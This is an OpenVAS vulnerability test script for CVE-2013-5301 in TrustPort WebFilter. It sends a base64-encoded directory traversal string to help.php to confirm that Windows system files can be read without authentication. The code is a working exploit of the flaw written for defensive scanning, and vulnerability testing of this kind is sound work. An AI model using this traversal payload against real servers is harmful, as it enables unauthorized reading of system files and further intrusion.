###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trustport_61662.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# TrustPort WebFilter 'help.php' Arbitrary File Access Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103751");
  script_cve_id("CVE-2013-5301");
  script_bugtraq_id(61662);
  script_version("$Revision: 11401 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-08-08 10:35:29 +0200 (Thu, 08 Aug 2013)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_name("TrustPort WebFilter 'help.php' Arbitrary File Access Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 4849);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61662");

  script_tag(name:"impact", value:"An attacker can exploit this issue to read arbitrary files in the
  context of the web server process, which may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special GET request, with a base64 encoded
  directory traversal string and file name");

  script_tag(name:"insight", value:"A vulnerability exists within the help.php script, allowing an remote attacker to
  access files outside of the webroot with SYSTEM privileges, without authentication.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"TrustPort WebFilter is prone to an arbitrary file-access
  vulnerability.");

  script_tag(name:"affected", value:"TrustPort WebFilter 5.5.0.2232 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");

port = get_http_port(default:4849);
if(!can_host_php(port:port)) exit(0);
soc = open_sock_tcp(port);
if(!soc)exit(0);

send(socket:soc, data:'GET /index1.php HTTP/1.0\r\n\r\n');
while(r = recv(socket:soc, length:1024)) {
  resp += r;
}

close(soc);
if("<title>TrustPort WebFilter" >!< resp)exit(0);

files = traversal_files('windows');

foreach file(keys(files)) {

  traversal = '../../../../../../../../../../../../../../../' + files[file];
  traversal = base64(str:traversal);

  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  url = '/help.php?hf=' + traversal;
  req = 'GET ' + url + ' HTTP/1.0\n\n\n\n';
  send(socket:soc, data:req);

  while(r = recv(socket:soc, length:1024)) {
    ret += r;
  }
  close(soc);

  if(eregmatch(pattern:file, string:ret)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
